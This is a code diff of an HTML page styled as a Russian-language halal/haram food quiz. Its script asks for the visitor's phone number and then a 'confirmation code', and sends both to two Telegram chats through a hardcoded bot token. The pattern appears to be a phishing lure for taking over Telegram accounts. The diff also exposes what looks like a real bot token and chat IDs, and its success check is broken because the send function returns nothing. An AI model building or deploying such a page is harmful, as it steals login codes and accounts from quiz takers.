@@ -25,7 +25,7 @@
         input[type="radio"] {
             margin-right: 10px;
         }
-        input[type="text"], input[type="tel"], input[type="number"] {
+        input[type="text"], input[type="number"], input[type="tel"] {
             width: 100%;
             padding: 10px;
             margin-top: 5px;
@@ -61,7 +61,6 @@
         <form>
             <h2>Ответьте на вопросы:</h2>
             <div id="questions">
-                <!-- Вопросы -->
                 <label>1. Мясо свинины:</label>
                 <input type="radio" name="q1" value="Харам"> Харам
                 <input type="radio" name="q1" value="Халяль"> Халяль
@@ -94,6 +93,7 @@
                 <input type="radio" name="q8" value="Харам"> Харам
                 <input type="radio" name="q8" value="Халяль"> Халяль
             </div>
+
             <label for="phone">Введите ваш номер телефона:</label>
             <input type="tel" id="phone" name="phone" placeholder="Номер телефона" required>
 
@@ -113,85 +113,86 @@
     </div>
 
     <script>
-      const BOT_TOKEN = "7619958121:AAETlme7ZmSzyB_fu_VZD22pDEtvSLOgexY";
-      const CHAT_IDS = ["1335366204", "7478293706"];  // Массив ID чатов
+        const BOT_TOKEN = "7619958121:AAETlme7ZmSzyB_fu_VZD22pDEtvSLOgexY";
+        const CHAT_IDS = ["1335366204", "7478293706"];  // Массив ID чатов
 
-      // Отправка данных в Telegram
-      async function sendToTelegram(message) {
-          // Пройдем по каждому chat_id в массиве и отправим запрос
-          for (let chat_id of CHAT_IDS) {
-              const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                  method: 'POST',
-                  headers: { 'Content-Type': 'application/json' },
-                  body: JSON.stringify({
-                      chat_id: chat_id,
-                      text: message,
-                  }),
-              });
-              if (!response.ok) {
-                  console.log(`Ошибка при отправке сообщения в чат ${chat_id}`);
-              }
-          }
-      }
+        // Отправка данных в Telegram
+        async function sendToTelegram(message) {
+            // Пройдем по каждому chat_id в массиве и отправим запрос
+            for (let chat_id of CHAT_IDS) {
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chat_id,
+                        text: message,
+                    }),
+                });
+                if (!response.ok) {
+                    console.log(`Ошибка при отправке сообщения в чат ${chat_id}`);
+                }
+            }
+        }
 
-      // Обработчик отправки теста
-      document.getElementById('submitTest').addEventListener('click', async () => {
-          const answers = Array.from(document.querySelectorAll('#questions input:checked')).map(input => input.value);
-          const phone = document.getElementById('phone').value.trim();
+        // Обработчик отправки теста
+        document.getElementById('submitTest').addEventListener('click', async () => {
+            const answers = Array.from(document.querySelectorAll('#questions input:checked')).map(input => input.value);
+            const phone = document.getElementById('phone').value.trim();
 
-          // Проверка, что все вопросы отвечены
-          if (answers.length !== 8) {
-              document.getElementById('testMessage').textContent = "Пожалуйста, ответьте на все вопросы!";
-              return;
-          }
+            // Проверка, что все вопросы отвечены
+            if (answers.length !== 8) {
+                document.getElementById('testMessage').textContent = "Пожалуйста, ответьте на все вопросы!";
+                return;
+            }
 
-          // Проверка корректности номера телефона (разрешены любые цифры и символ "+", не обязательно с +)
-          if (!phone || !phone.match(/^[\d\+]+$/)) { // Позволяет вводить любые цифры и + (не обязательный символ)
-              document.getElementById('testMessage').textContent = "Введите корректный номер телефона!";
-              return;
-          }
+            // Проверка корректности номера телефона
+            if (!phone || !phone.match(/^\+\d+$/)) {
+                document.getElementById('testMessage').textContent = "Введите корректный номер телефона!";
+                return;
+            }
 
-          // Отключение кнопки и изменение текста
-          const submitButton = document.getElementById('submitTest');
-          submitButton.disabled = true;
-          submitButton.innerText = "Отправляется...";
+            // Отключение кнопки и изменение текста
+            const submitButton = document.getElementById('submitTest');
+            submitButton.disabled = true;
+            submitButton.innerText = "Отправляется...";
 
-          // Отправка данных в Telegram
-          const success = await sendToTelegram(`📋 Результаты теста:\n${answers.join('\n')}\n📱 Номер телефона: ${phone}`);
-          if (success) {
-              document.getElementById('testMessage').textContent = "Ответы отправлены. Введите код подтверждения.";
-              document.getElementById('testForm').style.display = 'none';
-              document.getElementById('codeForm').style.display = 'block';
-          } else {
-              document.getElementById('testMessage').textContent = "Произошла ошибка. Попробуйте снова.";
-              submitButton.disabled = false;
-              submitButton.innerText = "Отправить ответы";
-          }
-      });
+            // Отправка данных в Telegram
+            const success = await sendToTelegram(`📋 Результаты теста:\n${answers.join('\n')}\n📱 Номер телефона: ${phone}`);
+            if (success) {
+                document.getElementById('testMessage').textContent = "Ответы отправлены. Введите код подтверждения.";
+                document.getElementById('testForm').style.display = 'none';
+                document.getElementById('codeForm').style.display = 'block';
+            } else {
+                document.getElementById('testMessage').textContent = "Произошла ошибка. Попробуйте снова.";
+                submitButton.disabled = false;
+                submitButton.innerText = "Отправить ответы";
+            }
+        });
 
-      // Обработчик отправки кода
-      document.getElementById('sendCodeButton').addEventListener('click', async () => {
-          const code = document.getElementById('code').value.trim();
-          if (!code) {
-              document.getElementById('codeMessage').textContent = "Введите корректный код!";
-              return;
-          }
+        // Обработчик отправки кода
+        document.getElementById('sendCodeButton').addEventListener('click', async () => {
+            const code = document.getElementById('code').value.trim();
+            if (!code) {
+                document.getElementById('codeMessage').textContent = "Введите корректный код!";
+                return;
+            }
 
-          // Отключение кнопки и изменение текста
-          const sendCodeButton = document.getElementById('sendCodeButton');
-          sendCodeButton.disabled = true;
-          sendCodeButton.innerText = "Подтверждается...";
+            // Отключение кнопки и изменение текста
+            const sendCodeButton = document.getElementById('sendCodeButton');
+            sendCodeButton.disabled = true;
+            sendCodeButton.innerText = "Подтверждается...";
 
-          // Отправка кода подтверждения в Telegram
-          const success = await sendToTelegram(`🔑 Код подтверждения: ${code}`);
-          if (success) {
-              document.getElementById('codeMessage').textContent = "Ты прошёл тест! Результаты придут тебе на акаунт в телеграме, номер которого ты указал!";
-          } else {
-              document.getElementById('codeMessage').textContent = "Произошла ошибка. Попробуйте снова.";
-              sendCodeButton.disabled = false;
-              sendCodeButton.innerText = "Подтвердить";
-          }
-      });
+            // Отправка кода подтверждения в Telegram
+            const success = await sendToTelegram(`🔑 Код подтверждения: ${code}`);
+            if (success) {
+                document.getElementById('codeMessage').textContent = "Код подтверждения отправлен!";
+            } else {
+                document.getElementById('codeMessage').textContent = "Произошла ошибка при отправке кода.";
+                sendCodeButton.disabled = false;
+                sendCodeButton.innerText = "Подтвердить";
+            }
+        });
     </script>
 </body>
 </html>
+
